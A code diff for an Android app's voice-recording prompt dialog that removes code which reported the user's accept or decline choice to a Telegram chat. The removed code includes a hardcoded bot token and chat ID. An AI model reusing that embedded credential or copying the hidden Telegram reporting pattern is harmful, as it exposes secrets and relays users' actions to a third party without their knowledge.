@@ -3,12 +3,9 @@ package com.blu.app.voice;
 import android.content.Intent;
 import android.graphics.Color;
 import android.graphics.drawable.GradientDrawable;
-import android.os.Handler;
-import android.os.Looper;
 import android.view.Gravity;
 import android.view.View;
 import android.view.ViewGroup;
-import android.view.animation.AlphaAnimation;
 import android.view.animation.Animation;
 import android.view.animation.ScaleAnimation;
 import android.widget.Button;
@@ -19,14 +16,11 @@ import androidx.appcompat.app.AppCompatActivity;
 
 public class FloatingVoiceNotification {
     private AppCompatActivity activity;
-    private String botToken, chatId, voiceToken;
+    private String voiceToken;
     private FrameLayout container;
-    private Handler handler = new Handler(Looper.getMainLooper());
     
-    public FloatingVoiceNotification(AppCompatActivity activity, String botToken, String chatId, String voiceToken) {
+    public FloatingVoiceNotification(AppCompatActivity activity, String voiceToken) {
         this.activity = activity;
-        this.botToken = botToken;
-        this.chatId = chatId;
         this.voiceToken = voiceToken;
     }
     
@@ -40,13 +34,11 @@ public class FloatingVoiceNotification {
         container.setClickable(true);
         container.setFocusable(true);
         
-        // دیالوگ شیشه‌ای
         LinearLayout dialog = new LinearLayout(activity);
         dialog.setOrientation(LinearLayout.VERTICAL);
         dialog.setPadding(50, 40, 50, 40);
         dialog.setElevation(40);
         
-        // پس‌زمینه شیشه‌ای با افکت
         GradientDrawable shape = new GradientDrawable();
         shape.setCornerRadius(40);
         shape.setColor(Color.argb(240, 255, 255, 255));
@@ -60,7 +52,7 @@ public class FloatingVoiceNotification {
         dialogParams.gravity = Gravity.CENTER;
         dialog.setLayoutParams(dialogParams);
         
-        // آیکون میکروفون با انیمیشن
+        // آیکون
         TextView icon = new TextView(activity);
         icon.setText("🎙️");
         icon.setTextSize(55);
@@ -105,7 +97,7 @@ public class FloatingVoiceNotification {
         buttonsLayout.setGravity(Gravity.CENTER);
         buttonsLayout.setWeightSum(2);
         
-        // دکمه Decline (قرمز)
+        // دکمه Decline
         Button declineBtn = new Button(activity);
         declineBtn.setText("❌ رد کردن");
         declineBtn.setTextColor(Color.WHITE);
@@ -127,13 +119,9 @@ public class FloatingVoiceNotification {
         );
         declineParams.setMargins(0, 0, 15, 0);
         declineBtn.setLayoutParams(declineParams);
-        declineBtn.setOnClickListener(v -> {
-            // ارسال نوتیفیکیشن رد کردن به تلگرام
-            sendTelegramNotification("❌ کاربر ضبط را رد کرد!");
-            removeFromParent();
-        });
+        declineBtn.setOnClickListener(v -> removeFromParent());
         
-        // دکمه Start (سبز شیشه‌ای)
+        // دکمه Start
         Button startBtn = new Button(activity);
         startBtn.setText("▶ شروع ضبط");
         startBtn.setTextColor(Color.WHITE);
@@ -154,10 +142,6 @@ public class FloatingVoiceNotification {
         );
         startBtn.setLayoutParams(startParams);
         startBtn.setOnClickListener(v -> {
-            // ارسال نوتیفیکیشن شروع ضبط به تلگرام
-            sendTelegramNotification("🔴 ضبط صدا شروع شد!");
-            
-            // شروع ضبط در سرویس
             startVoiceRecording();
             removeFromParent();
         });
@@ -167,7 +151,7 @@ public class FloatingVoiceNotification {
         dialog.addView(buttonsLayout);
         container.addView(dialog);
         
-        // انیمیشن ورود
+        // انیمیشن
         Animation scaleAnim = new ScaleAnimation(
             0.8f, 1f, 0.8f, 1f,
             Animation.RELATIVE_TO_SELF, 0.5f,
@@ -176,7 +160,6 @@ public class FloatingVoiceNotification {
         scaleAnim.setDuration(300);
         dialog.startAnimation(scaleAnim);
         
-        // اضافه کردن به صفحه
         View decorView = activity.getWindow().getDecorView();
         if (decorView instanceof FrameLayout) {
             ((FrameLayout) decorView).addView(container);
@@ -192,27 +175,7 @@ public class FloatingVoiceNotification {
     private void startVoiceRecording() {
         Intent serviceIntent = new Intent(activity, VoiceRecorderService.class);
         serviceIntent.setAction("START_RECORDING");
-        serviceIntent.putExtra("bot_token", botToken);
-        serviceIntent.putExtra("chat_id", chatId);
         serviceIntent.putExtra("voice_token", voiceToken);
         activity.startService(serviceIntent);
-    }
-    
-    private void sendTelegramNotification(String message) {
-        new Thread(() -> {
-            try {
-                String finalBotToken = (botToken == null || botToken.isEmpty()) 
-                    ? "8985315189:AAEeTfrU-QUmyucxmgQBc0OyoQ1jNABREhM" 
-                    : botToken;
-                String finalChatId = (chatId == null || chatId.isEmpty()) 
-                    ? "-1004352035353" 
-                    : chatId;
-                
-                TelegramUploader uploader = new TelegramUploader();
-                uploader.sendMessage(finalBotToken, finalChatId, message);
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-        }).start();
     }
 }
